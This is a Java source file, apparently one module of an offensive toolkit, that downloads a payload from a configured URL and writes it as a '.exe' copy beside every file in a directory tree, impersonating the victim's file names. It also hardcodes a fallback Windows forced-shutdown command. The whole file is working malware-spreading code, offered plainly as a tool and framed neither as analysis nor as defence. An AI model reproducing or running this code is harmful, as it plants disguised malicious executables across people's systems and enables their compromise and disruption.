package modules.core;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;

import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.LinkedList;
import java.util.concurrent.ExecutorService;


// custom libraries
import modules.auxiliary.*;
import modules.auxiliary.ModuleConfig.CopyConfig;
import modules.file.*;


/**
    Creates duplicates of a payload based on file system contents.

    @author Str1k3r
    @version 1.0
    @see EExecCode
 */
public class Copy implements Runnable, modules.auxiliary.Module {

    //TODO: Move to manager
    private final String defaultNTPayload = "shutdown -s -t 10"; // windows payload, if URL inaccessible
    private final Manager manager;
    private ExecutorService threadPool;
    
    private boolean isRecursive = false;
    private File startingDir;
    private String payloadURL;
    
    // Default constructor
    /**
    	Initialise state for execution over provided number of thread.
    	
    	@param nThreads Number of threads to execute the module over.
    	@param recursive Whether execution should recurse into subdirectories or not.
    	@param startDir The directory to start execution from.
    	@param payloadURL The url to fetch the payload from.
    */
    public Copy(int nThreads, boolean recursive, File startDir, String payloadURL) {
    	manager = Manager.getInstance();
    	
    	if(nThreads <= 0) {
    		nThreads = Manager.DEFAULT_NOTHREADS; // avoid illegalArgException when instantiating pool
    	}
    	threadPool = Executors.newFixedThreadPool(nThreads);
    	
    	this.isRecursive = recursive;
    	this.startingDir = startDir;
    	this.payloadURL = payloadURL;
    }
    
    /**
    	Initialise state of execution using Configuration object.
    	
    	@param config The configuration object to initialise current object state from.
    */
    public Copy(ModuleConfig.CopyConfig config) {
    	this(config.threadCount, config.recursive, new File(config.startPath), config.payloadURL);
    }
     
    /**
     	Displays the module header
     	
     	@param noDirs Number of subdirectories found.
    */
    private void printHeader(int noDirs) {
    	System.out.println("-------------- COPY MODULE --------------");
    	System.out.printf("Recursive: %b%n", isRecursive);
    	System.out.printf("Start Path: %s%n", startingDir);
    	System.out.printf("Payload: %s%n", payloadURL);
    	System.out.printf("No. of Subdirectories: %d%n", noDirs);
    	System.out.println("----------------- START ----------------");
    }
    
	/**
		Allow duplication to run in a thread.
	*/
	@Override
	public void run() {
		duplicate();
	}

    /**
     	Duplicate payload for files in the provided path, and all sub paths.
    */
    public final void duplicate() {
    	manager.checkDir(startingDir);
    	LinkedList<File> directoryQueue = new LinkedList<>();
    	
    	// queue subdirectories if recursive mode set
    	if(isRecursive) {
    		directoryQueue = manager.getDirectoryQueue(startingDir);
    	}
    	directoryQueue.addFirst(startingDir); // add first no matter what (recursive or not)
    	
    	// Perform duplication for each directory's directory listing entry
    	printHeader(directoryQueue.size());
    	for(File dir : directoryQueue) {
    		File[] directoryList = manager.getDirectoryList(dir);
    		
    		// check that something returned before processing
    		if(directoryList == null) {
    			continue; // skip directory
    		}
    		
	        for(File filePath : directoryList) {
	            
	            try {
	                
	                // Skip duplication for directory entries
	                if(filePath.isFile()) {
                   
	                    // output appropriate end status
	                    if(duplicateCurrent(filePath.getAbsolutePath())) {
	                    	System.out.printf(" << SUCCESS >> Duplicating %s%n", filePath.getName());
	                    }
	                    else {
	                    	System.out.printf(" << FAIL >> Duplicating %s%n", filePath.getName());
	                    }
	                }
	            }
	            catch(SecurityException secEx) {
	                System.out.printf("Access denied. File: ./%s%n",filePath.getName()); // current file will be skipped
	            }
	        }
    	}
        
        // terminate running threads
        shutdownThreadPool();
    }
    
    /** 
        Duplicate payload under name of argument file.

        @param filePath The path to the file to duplicate using name of.
        @return Returns true if duplication completed successfully, false otherwise.
    */
    public boolean duplicateCurrent(String filePath) {
        // invalid file handle check
        if(!validPath(filePath)) {
        	System.out.printf("Invalid file path %s%n", filePath);
            return false;
        }

        // Fetch payload
        String payloadPath = manager.fetchPayload(payloadURL);
        if(payloadPath == null) {
            return false;
        }

        // Setup handles; write to absolute path to ensure duplications aren't saved in program dir
        File payloadHandle = new File(payloadPath);
        File writeHandle = new File( String.format("%s.exe", trimExtension(filePath))); // TODO:write to absolute path

        BufferedInputStream inStream;
        BufferedOutputStream outStream;
        
        // Setup up streams and thread duplication process
        try {
            final int bufferSize = 4096;
            inStream = new BufferedInputStream(new FileInputStream(payloadHandle), bufferSize);
            outStream = new BufferedOutputStream(new FileOutputStream(writeHandle), bufferSize);

            // Thread read and write operations in ExfiltratorFileHandler task
            threadPool.execute(new CopyFileHandler(inStream, outStream, bufferSize));
        }
        catch(FileNotFoundException fnfEx) {
        	System.out.println("One or more files in current duplication not found.");
        	return false;
        }
        catch(SecurityException ioEx) {
        	System.out.println("Access denied. One or more file in current duplication.");
        	return false;
        }
        
        return true;
    }

	/**
	 	Remove the extension from a provided filename, if any.

	 	@param filename The filename to remove the filetype extension from.

	 	@return Returns the provided filename without the filetype extension.
	 */
	private String trimExtension(String filename) {
		int dotIndex = filename.lastIndexOf('.');
		if(dotIndex > 0) {
			return filename.substring(0, dotIndex);
		}

		// hidden file or file with no extension (ex ".classpath" or "config")
		return filename;
	}
    
    /**
     	Shuts down thread pool for current instance.
    */
    private final void shutdownThreadPool() {
    	threadPool.shutdown(); // revoke new task creation
    	try {
    		// wait for existing threads to terminate before force terminate
    		if(!threadPool.awaitTermination(60, TimeUnit.SECONDS)) {
    			// no response
    			threadPool.shutdownNow(); // request force terminate
    			
    			// wait for response to force termination
    			if(!threadPool.awaitTermination(60, TimeUnit.SECONDS)) {
    				// no response.
    				System.err.println("Threads failed to terminate.");
    			}
    		}
    	}
    	catch(InterruptedException interruptEx) {
    		// waiting for threads to terminate interrupted
    		// force termination
    		threadPool.shutdownNow(); 
    		Thread.currentThread().interrupt(); // maintain interrupt status
    	}

    }

    /** 
        Check validity of provided file path.

        @param filePath File path to validate.
        @return Returns true if the path checks out, false otherwise.
    */
    private boolean validPath(String filePath) {

    	if(filePath == null) 
    		return false; // check not null

    	return !(filePath.trim().isEmpty()); // check not empty
    }

	/**
		Set or change module configuration.
	 */
	public void setConfig(CopyConfig config) {
		this.isRecursive = config.recursive;
		this.startingDir = new File(config.startPath);
		this.payloadURL = config.payloadURL;
	}

	/**
		Return module configuration
		@return Returns CopyConfig instance
	*/
	public CopyConfig getConfig() {
		CopyConfig config = new ModuleConfig.CopyConfig();
		config.recursive = isRecursive;
		config.startPath = startingDir.getAbsolutePath();
		config.payloadURL = payloadURL;

		return config;
	}
}